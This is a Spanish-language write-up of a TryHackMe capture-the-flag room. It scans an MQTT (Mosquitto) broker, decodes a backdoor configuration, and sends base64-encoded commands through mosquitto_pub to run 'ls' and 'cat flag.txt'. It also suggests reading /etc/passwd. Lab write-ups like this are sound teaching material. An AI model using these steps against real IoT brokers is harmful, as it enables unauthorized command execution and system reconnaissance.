Bienvenidos a otra sala de tryhackme, en esta ocasion ayudaremos a John a investigar actividad sospechosa dentro de sus tecnologias IoT. Utilizaremos nuestro scaneo nmap para encontrar puertos abiertos y su respectiva informacion. Luego nos adentraremos del puerto 1883 (Mosquitto) utilizando las herramientas `mosquitto_sub & mosquitto_pub` para subscribirnos a una configurar y desde otra parte poder enviar mensajes antes de poder reclamar nuestra flag.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.22s latency).
Scanned at 2023-05-26 19:18:16 EDT for 30s
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE                  REASON         VERSION
1883/tcp open  mosquitto version 2.0.14 syn-ack ttl 62

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 26 19:18:46 2023 -- 1 IP address (1 host up) scanned in 30.18 seconds

```

Como podemos ver, obtenemos nuestro puerto 1883 (Mosquitto) abierto con su respectiva informacion. Para obtener una vista mas detallada del que configuraciones estan habilitadas y cual utiliza John, realizaremos otro scaneo de nmap con el script por defecto asi nos enumera todas sus configuraciones y si vemos alguna actividad sospechosa en ella.
Ejecutamos el siguiente comando `sudo nmap -p 1883 -sCV IPTARGET -oN nmap2`

```ruby

PORT     STATE SERVICE                  VERSION
1883/tcp open  mosquitto version 2.0.14
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/load/messages/received/15min: 20.48
|     $SYS/broker/load/messages/sent/5min: 65.64
|     $SYS/broker/uptime: 231 seconds
|     $SYS/broker/load/messages/received/5min: 49.18
|     $SYS/broker/load/bytes/sent/5min: 882.45
|     storage/thermostat: {"id":5077919781334851750,"temperature":24.097372}
|     $SYS/broker/load/bytes/received/1min: 4335.58
|     $SYS/broker/load/publish/sent/5min: 16.47
|     $SYS/broker/load/connections/1min: 1.90
|     $SYS/broker/version: mosquitto version 2.0.14
|     $SYS/broker/load/bytes/sent/15min: 333.31
|     $SYS/broker/bytes/received: 16305
|     $SYS/broker/clients/active: 2
|     $SYS/broker/clients/maximum: 3
|     yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config: eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==
|     $SYS/broker/load/messages/sent/15min: 26.51
|     $SYS/broker/load/sockets/5min: 0.97
|     $SYS/broker/clients/disconnected: 1
|     frontdeck/camera: {"id":3409962715125157732,"yaxis":-89.83001,"xaxis":-171.43459,"zoom":0.49935168,"movement":false}
|     $SYS/broker/bytes/sent: 7714
|     livingroom/speaker: {"id":7910963578592638383,"gain":66}
|     kitchen/toaster: {"id":10117717584146372151,"in_use":false,"temperature":146.48466,"toast_time":305}
|     patio/lights: {"id":3573975033886317032,"color":"WHITE","status":"OFF"}
|     $SYS/broker/load/sockets/15min: 0.37
|     $SYS/broker/publish/bytes/sent: 1235
|     $SYS/broker/subscriptions/count: 5
|     $SYS/broker/clients/inactive: 1
|     $SYS/broker/store/messages/bytes: 283
|     $SYS/broker/clients/connected: 2
|     $SYS/broker/publish/messages/sent: 148
|     $SYS/broker/load/bytes/received/15min: 963.47
|     $SYS/broker/load/publish/sent/15min: 6.03
|     $SYS/broker/load/messages/sent/1min: 142.88
|     $SYS/broker/load/messages/received/1min: 94.09
|     $SYS/broker/load/bytes/sent/1min: 2403.76
|     $SYS/broker/messages/sent: 492
|     $SYS/broker/clients/total: 3
|     $SYS/broker/load/bytes/received/5min: 2305.89
|     $SYS/broker/load/sockets/1min: 2.71
|     $SYS/broker/publish/bytes/received: 11540
|     $SYS/broker/load/publish/sent/1min: 48.78
|     $SYS/broker/load/connections/5min: 0.78
|     $SYS/broker/load/connections/15min: 0.31
|_    $SYS/broker/messages/received: 346

```

# Research 

Anteriormente obtuvimos informacion especifica sobre las posibles amenzas que pueden afectar a John en su configuracion IoT. Podremos ver algo fuera de lo comun que parece estar codificado en base64 : `yR3gPp0r8Y/AGlaMxmHJe/qV66JF5qmH/config: eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==`

Si decodificamos el mensaje, nos quedaria de la siguiente manera : 
```python
echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==" | base64 -d

{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","registered_commands":["HELP","CMD","SYS"],"pub_topic":"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub","sub_topic":"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}
```

Con esto en mente, veremos las subscripcion que configuro el atacante `XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub` y  el canal que utilizo para comunicarse `U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub`. En este caso, haremos lo mismo que el atacante realizo con las herramientas `mosquitto_pub & mosquitto_sub `, para instalar estas herramientas utilizaremos `sudo apt install mosquitto-clients`. 

Abriremos dos terminales, y escribiremos las siguientes consultas :

```ruby
mosquitto_sub -h IPTARGET -t U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub
mosquitto_pub -h IPTARGET -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m "hello"
```

Basicamente lo que estamos haciendo con estos comandos, es comunicarnos a traves de las configuraciones. Una vez nos subscribimos, nos pondremos en "escucha" para recibir cualquier tipo de mensaje. Por otra parte, en el otro comando le estaremos mandando mensajes para recibirlos, algo simple como "hello".
Una vez realizada esta accion, nos dara el siguiente mensaje codificado :
`SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=

Al decodificarnos nos mostrara : 

```
Invalid message format.
Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})
```

Por lo que podremos utilizar comandos dentro de una terminal respetando el formato (base64). Podremos realizar la siguiente consulta 

```python
{"id": "44433553", "cmd": "CMD", "arg": "ls"}

## Codificamos

eyJpZCI6ICI0NDQzMzU1MyIsICJjbWQiOiAiQ01EIiwgImFyZyI6ICJscyJ9

## Escribimos 

mosquitto_pub -h IPTARGET -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m eyJpZCI6ICI0NDQzMzU1MyIsICJjbWQiOiAiQ01EIiwgImFyZyI6ICJscyJ9

## Nos responde donde estamos subscripto

eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9

## Decodificamos

{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt\n"}

```

Podremos ver que funciona, y esta almacenada nuestra flag, por lo que solo tendrias que modificar la siguiente consulta para poder echarle un vistazo a su contenido : 

```python
{"id": "44433231653", "cmd": "CMD", "arg": "cat flag.txt"}
```

Repetimos el proceso y reclamamos la flag. Tambien puede pobrar utilizando comandos de enumeracion como `cat /etc/passwd` y asi obtener un poco mas de informacion del sistema.